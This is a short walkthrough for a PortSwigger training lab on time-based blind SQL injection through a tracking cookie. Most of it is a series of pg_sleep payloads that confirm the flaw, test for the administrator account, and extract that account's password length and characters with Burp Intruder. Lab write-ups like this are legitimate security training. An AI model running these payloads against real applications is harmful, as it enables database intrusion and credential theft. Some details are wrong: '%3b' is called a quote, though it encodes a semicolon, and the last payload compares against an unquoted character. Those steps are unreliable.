# Lab: Blind SQL injection with time delays and information retrieval

## Lab's description

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

**End goal:**  log in as the `administrator` user.

## Solution

`%3b` for `'` and `pg_sleep(3)` delays for 3 seconds.

Modify your cookie to check for delay responding: `' %3bselect case when (1=1) then pg_sleep(5) else pg_sleep(0) end--`

We will see that it takes 5 seconds to load the website.

Now let check for username: `' %3bselect case when (username='administrator') then pg_sleep(5) else pg_sleep(0) end from users--`

Next we gonna see the length of the password. Send the target to Intruder and loop it from 1 to 20.

Add `ยง` to number 1

`' %3bselect case when (username='administrator' and length(password) > 1) then pg_sleep(5) else pg_sleep(0) end from users--`

After that, we will discover character-by-character for the password.

`' %3bselect case when (username='administrator' and substring(password,1,1) = a) then pg_sleep(5) else pg_sleep(0) end from users--`

**Resource:** [Lab: Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval)
